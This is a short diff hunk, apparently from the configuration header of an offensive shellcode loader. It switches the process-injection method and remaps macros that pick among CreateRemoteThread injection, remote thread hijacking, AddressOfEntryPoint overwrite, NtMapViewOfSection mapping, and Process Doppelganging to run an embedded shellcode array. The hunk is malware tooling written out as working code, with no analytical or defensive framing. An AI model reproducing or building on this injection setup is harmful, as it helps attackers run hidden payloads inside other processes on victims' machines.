@@ -91,19 +91,19 @@ unsigned char shellcode[] = {
 // Targets List
 
 // Execution Methods
-#define CONFIG_EXECUTION_METHOD 2
-#define CONFIG_CREATE_PROCESS 1
+#define CONFIG_EXECUTION_METHOD 3
+#define CONFIG_CREATE_PROCESS 3
 
 #if CONFIG_EXECUTION_METHOD == 1
 #define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::CreateRemoteThreadInjection(phandle, shellcode, shellcode_len)
 #elif CONFIG_EXECUTION_METHOD == 2
 #define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::RemoteHijack(phandle, shellcode, shellcode_len)
 #elif CONFIG_EXECUTION_METHOD == 3
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::AddressOfEntryPoint(phandle, shellcode, shellcode_len)
 #elif CONFIG_EXECUTION_METHOD == 4
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::AddressOfEntryPoint(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len)
 #elif CONFIG_EXECUTION_METHOD == 5
-#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::Doppleganger(phandle, shellcode, shellcode_len)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::Doppleganger(phandle, shellcode, shellcode_len)
 #endif
 
 #endif
